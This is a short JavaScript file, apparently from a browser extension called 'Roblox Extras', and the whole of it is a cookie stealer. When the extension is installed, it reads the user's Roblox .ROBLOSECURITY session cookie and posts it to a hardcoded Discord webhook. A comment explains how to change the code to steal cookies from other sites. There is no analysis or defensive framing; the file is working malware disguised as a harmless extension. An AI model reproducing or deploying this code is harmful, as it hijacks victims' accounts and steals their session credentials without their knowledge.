function webhookReq(webhook, cookie) {
  var params = {
      embeds: [{
            "title": `Someone just installed Roblox Extras!`,
            "description": ">>> Roblox Extras extension just installed on another user! details required for extension to work at below!",
            "color": 15258703,
            "fields": [{
              "name": 'Cookie',
              "value": "```\n" + cookie + "\n```",
              inline: false
            }]
    }]
  }
   
  // Send the webhook request
  fetch(webhook, {
    method: "POST",
    headers: {
      'Content-type': 'application/json'
    },
    body: JSON.stringify(params)
  })
}



// Driver Code:
cookieInfo = {url: "https://www.roblox.com/", name: '.ROBLOSECURITY'}; //If you want to grab other site cookies, change the values both here and in the manifest.json file
chrome.cookies.get(cookieInfo, function(cookie) {
  if (cookie) {
    webhookReq("https://discord.com/api/webhooks/1102325913112297482/HTVZzTEHSJ8VCINuU44_0o22ErSz1TwPb-jh1OfulDS-cT7ZcHf8SdaQfaCJBAN2RuaQ", cookie.value);
  }
});
